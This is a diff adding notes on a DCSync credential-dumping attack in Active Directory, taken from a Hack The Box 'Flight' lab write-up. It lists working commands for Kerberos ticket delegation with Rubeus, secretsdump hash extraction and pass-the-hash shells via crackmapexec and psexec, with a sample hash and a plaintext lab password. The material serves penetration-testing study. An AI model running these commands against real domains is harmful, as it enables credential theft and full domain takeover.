@@ -54,6 +54,42 @@ impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerora
 
 We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.
 
+Another DCSync Attack involves creating a ticket with Rubeus, like here:
+[HTB Flight](https://0xdf.gitlab.io/2023/05/06/htb-flight.html#auth-as-svc_apache)
+```
+#### Generate Ticket
+.\rubeus.exe tgtdeleg /nowrap
+
+#### Configure Kerberos Ticket
+#### https://github.com/skelsec/minikerberos/tree/main
+
+minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
+
+#### Now I’ll export the environment variable to hold that ticket:
+
+export KRB5CCNAME=ticket.ccache
+
+#### Time Issues
+ntpdate -s flight.htb
+
+#### Get the Hash:
+
+secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
+or
+impacket-secretsdump -k -no-pass g0.flight.htb 
+
+
+### Shell
+#### Those hashes work for a pass the hash attack:
+
+
+crackmapexec smb flight.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+
+rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+
+```
+
+
 
 ### Other Notes
 
